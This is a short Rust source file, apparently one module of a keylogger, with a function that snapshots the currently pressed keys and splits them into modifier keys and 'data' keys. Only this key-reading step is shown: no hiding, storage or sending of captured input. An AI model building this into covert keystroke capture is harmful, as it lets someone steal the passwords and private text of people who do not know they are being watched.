use device_query::{DeviceQuery, DeviceState};

// let mut prev_ctrl_keys: Vec<device_query::Keycode> = vec![];
// let mut prev_data_keys: Vec<device_query::Keycode> = vec![];

/// Keylogger launch function
pub fn run() -> std::collections::HashMap<String, Vec<device_query::Keycode>> {
    let device_state = DeviceState::new();
    
    let ctrl_keycodes = vec![
        device_query::Keycode::LShift,
        device_query::Keycode::RShift,
        device_query::Keycode::LControl,
        device_query::Keycode::RControl,
        device_query::Keycode::LAlt,
        device_query::Keycode::RAlt,
        device_query::Keycode::Escape,
    ];

    let keys = device_state.get_keys();
    let mut ctrl_keys: Vec<device_query::Keycode> = Vec::new();
    let mut data_keys: Vec<device_query::Keycode> = Vec::new();

    for key in &keys {
        if ctrl_keycodes.contains(key) {
            ctrl_keys.push(*key);
        } else {
            data_keys.push(*key);
        }
    }

    let mut key_map: std::collections::HashMap <String, Vec<device_query::Keycode>> = std::collections::HashMap::new();
    key_map.insert("ctrl".to_string(), ctrl_keys);

    key_map.insert("data".to_string(), data_keys);

    return key_map;
}
